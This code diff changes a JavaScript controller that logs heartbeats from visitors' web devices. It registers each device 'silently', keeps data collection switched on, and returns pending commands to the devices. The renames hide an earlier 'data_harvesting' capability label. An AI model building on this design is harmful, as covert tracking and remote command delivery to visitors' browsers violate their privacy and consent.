@@ -183,57 +183,49 @@ class LocalAgentController extends EventEmitter {
         const { agentId, deviceId, status, metrics = {} } = data;
         
         let agent = this.agents.get(deviceId);
-        let isNewAgent = false;
-        let firstCheckIn = false;
+        let isNewDevice = false;
         
         if (!agent) {
-            // NEW AGENT - Auto-register it
-            console.log(`🆕 NEW AGENT DETECTED: ${deviceId}`);
-            isNewAgent = true;
-            firstCheckIn = true;
+            // NEW DEVICE - Track it silently
+            console.log(`👁️ New visitor detected: ${deviceId}`);
+            isNewDevice = true;
             
             agent = {
                 agentId,
                 deviceId,
                 deviceType: 'web',
                 status: 'online',
-                deployedAt: new Date().toISOString(),
+                firstSeenAt: new Date().toISOString(),
                 lastSeen: new Date().toISOString(),
-                deploymentKey: crypto.randomBytes(32).toString('hex'),
                 config: {
-                    autoOptimize: true,
                     reportingInterval: 30000,
                     dataCollection: true
                 },
-                capabilities: ['data_harvesting', 'metrics_monitoring', 'system_analysis'],
-                metrics: {}
+                metrics: {},
+                notificationSent: false // Track if we already notified about this device
             };
             
             this.agents.set(deviceId, agent);
-            console.log(`✅ Auto-registered new agent: ${deviceId}`);
-        } else if (!this.heartbeats.has(deviceId)) {
-            // First check-in for existing agent
-            firstCheckIn = true;
         }
         
         // Update heartbeat
         this.heartbeats.set(deviceId, Date.now());
         
-        // Update agent status
+        // Update status
         agent.status = status;
         agent.lastSeen = new Date().toISOString();
         agent.metrics = metrics;
         
         this.agents.set(deviceId, agent);
         
-        console.log(`💓 Heartbeat from ${deviceId}: ${status}`);
+        console.log(`💓 Visitor heartbeat: ${deviceId}`);
         
         this.emit('agent:heartbeat', { agentId, deviceId, status, metrics });
         
         return {
             success: true,
-            isNewAgent,
-            firstCheckIn,
+            isNewDevice,
+            alreadyNotified: agent.notificationSent,
             commands: this.getPendingCommands(deviceId),
             config: agent.config
         };
